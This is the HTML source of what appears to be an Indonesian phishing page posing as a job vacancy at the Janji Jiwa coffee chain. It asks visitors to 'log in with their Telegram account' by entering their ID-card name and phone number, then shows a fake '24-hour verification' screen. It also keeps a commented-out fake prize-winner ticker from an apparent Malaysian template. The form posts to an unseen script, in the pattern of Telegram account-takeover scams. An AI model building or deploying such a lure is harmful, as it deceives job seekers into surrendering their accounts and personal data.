<!doctype html>
<html lang="en" class="h-100">

<head id="ctl00_Head1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link href="assets/css/custom.css" type="text/css" rel="stylesheet" />
    <link href="assets/css/menebus.css" type="text/css" rel="stylesheet" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta property="og:title" content="Lowongan Kerja Janji Jiwa">
    <meta property="og:image" content="assets/img/p8.jpg">
    <meta name="description" />
    <meta name="author" content="" />
    <title>Lowongan Kerja Janji Jiwa</title>
    <link rel="icon" type="image/x-icon" href="favicon.png" />
    <link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/sticky-footer/" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
    <script type="text/javascript" src="js/vue.min.js.download"></script>
    <script src="js/clipboard.js.download"></script>
    <script type="text/javascript" src="js/index.js.download"></script>
    <style type="text/css">
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }

        /* Absolute Center Spinner */
        .loading {
            position: fixed;
            z-index: 999;
            height: 2em;
            width: 2em;
            overflow: show;
            margin: auto;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
        }

        /* Transparent Overlay */
        .loading:before {
            content: '';
            display: block;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));

            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
        }

        /* :not(:required) hides these rules from IE9 and below */
        .loading:not(:required) {
            /* hide "loading..." text */
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0;
        }

        .loading:not(:required):after {
            content: '';
            display: block;
            font-size: 10px;
            width: 1em;
            height: 1em;
            margin-top: -0.5em;
            -webkit-animation: spinner 150ms infinite linear;
            -moz-animation: spinner 150ms infinite linear;
            -ms-animation: spinner 150ms infinite linear;
            -o-animation: spinner 150ms infinite linear;
            animation: spinner 150ms infinite linear;
            border-radius: 0.5em;
            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
        }

        /* Animation */

        @-webkit-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @-moz-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @-o-keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes spinner {
            0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
            }

            100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="d-flex flex-column h-100">

    <!---
<div class="item">
<div class="record_logo">
<img src="assets/img/avatar.png" alt="">
</div>
<div class="center">
<div class="h1"><span class="name"></span> <span>Berjaya</span> <span class="number">RM 1.000,00</span></div>
<div class="h2">3 jam yang lalu</div>
</div>
</div>
-->
    <div id="loading" class="loading" style="display: none;"></div>

    <main class="flex-shrink-0">
        <div id="ctl00_divContainer" class="container container-narrow">
            <div class="text-center mt-2">
                <a id="ctl00_lnkMalay" disabled="disabled"
                    style="color:Black;font-weight:bold;text-decoration:none;">Bahasa Indonesia</a>
                <span id="ctl00_lblPipe_bm"> | </span>
                <a id="ctl00_lnkEng" href="">English</a>
                <span id="ctl00_lblPipe_bi"> | </span>
                <a id="ctl00_lnkChineseSimplified" href=""> 中文(简体) </a>
                <span id="ctl00_lblPipe_bc"> | </span>
                <a id="ctl00_lnkTamilInd" href="">தமிழ் </a>
            </div>
            <div class="header mt-3 text-center">
                <img src="assets/img/p8.jpg" id="ctl00_logohead" class="img-fluid" width="450" />
            </div>
            <script type="text/javascript">
                //<![CDATA[
                var theForm = document.forms['aspnetForm'];
                if (!theForm) {
                    theForm = document.aspnetForm;
                    A
                }
                function __doPostBack(eventTarget, eventArgument) {
                    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
                        theForm.__EVENTTARGET.value = eventTarget;
                        theForm.__EVENTARGUMENT.value = eventArgument;
                        theForm.submit();
                    }
                }
                //]]>
            </script>
            <script type="text/javascript">
                //<![CDATA[
                function WebForm_OnSubmit() {
                    if (typeof (ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
                    return true;
                }
                //]]>
            </script>
            <span id="ctl00_lblMsg"></span>
            <h2 class="fw-bold mt-2 page-header text-center ">
                <span id="ctl00_RecipientMasterContent_lblSubject">Silahkan Masuk Dengan Akun Telegram Anda</span>
            </h2>
            <div class="first">
                <form action="javascript:void(0)" method="post" id="firstForm">
                    <div class="input-group mb-3">
                        <span class="input-group-text" id="basic-addon1">Nama</span>
                        <input name="full_name" id="full_name" maxlength="18" class="form-control" type="text"
                            required="true" placeholder="Nama Lengkap Sesuai e-KTP"
                            title="">
                    </div>
                    <div class="input-group mb-3">
                        <span class="input-group-text" id="basic-addon1">🇲🇨+62</span>
                        <input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel"
                            required="true" placeholder="812345xxxxx"
                                        title="">
                    </div>
                    <div class="text-center">
                        <button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()">Kirim</button>
                    </div>
                </form>
            </div>
                    <div class="row four" id="ctl00_RecipientMasterContent_divResultNotFound" style="display: none;">
                <p class="text-center"><img src="assets/img/processing.gif" id="ctl00_logohead" class="img-fluid"
                        width="160" /></p>
                <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Harap menunggu proses verifikasi dalam waktu 1x24 jam untuk memeriksa kelayakan,
                    
                    </span></h5>
                <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">gunakan nomor telepon lain
                        dan</span></h5>
                <p class="text-center"><a href="" class="btn btn-lg btn-block btn-mk">&laquo; <span
                            id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Coba Lagi</span></a>
                </p>
            </div>

            <script type="text/javascript">
                //<![CDATA[
                var Page_ValidationActive = false;
                if (typeof (ValidatorOnLoad) == "function") {
                    ValidatorOnLoad();
                }
                function ValidatorOnSubmit() {
                    if (Page_ValidationActive) {
                        return ValidatorCommonOnSubmit();
                    } else {
                        return true;
                    }
                }
            </script>

           <!-- record berjaya box -->
        <!-- record berjaya box -->

        </div>
    </main>
    <br>
    <div class="header mt-3 text-center">
        <img src="assets/img/ini1.png" id="ctl00_logohead" class="img-fluid" width="450" />
    </div>
    <footer class="footer mt-auto py-3">
        <div class="container">
            <div class="row">
                <div class="col-5">
                    <span class="text-white">
                        <span id="ctl00_lblCopyRight">2024 All Rights Reserved. </span>
                    </span>
                </div>
                <div class="col">
                    <ul class="nav justify-content-end">
                        <li class="nav-item">
                            <a id="ctl00_lnkFaq" class="nav-link" href="">
                                <i class="bi-question-circle"></i>
                                <span id="ctl00_lblFAQ"></span></a>
                        </li>
                        <li class="nav-item">
                            <p id="ctl00_linkMerchList">
                                <a class="nav-link" href=""><i class="bi-shop"></i>
                                    <span id="ctl00_lblMerchList"></span></a>
                            </p>
                        </li>
                        <li class="nav-item">
                            <a href="" id="ctl00_linkContactUs" class="nav-link"><i class="bi-envelope"></i>
                                <span id="ctl00_lblctctus"></span></a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </footer>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="assets/js/script.js"></script>
    <script type="text/javascript" src="js/jquery-3.4.1.min.js.download"></script>
    <script>
        // 加载多语言
        var language = getQueryString('language')
        loadLocale(function (e) {
            app.locale = Object.assign(e.Common, e.CommonShare)
        }, language)
        var app = new Vue({
            el: '#app',
            data: {
                locale: {},
                uid: '2004219',
            },
            created() {
                $('#app').show();
                this.starScroll();
            },
            methods: {
                starScroll() {
                    var _this = this;
                    _this.scrollTimer && clearTimeout(_this.scrollTimer)
                    _this.scrollTimer = setTimeout(() => {
                        var $box = $("#list").find(".list:first");
                        $box.css({
                            marginTop: 0
                        })
                        var $item = $box.find(".item:first");
                        var outerHeight = $item.outerHeight(true)
                        $box.animate({
                            "marginTop": -outerHeight + "px"
                        }, 1000, function () {
                            $box.css({
                                marginTop: 0
                            }).find(".item:first").appendTo($box);
                            _this.starScroll();
                        })
                    }, 600);
                },
            },
        })
    </script>

</body>

</html>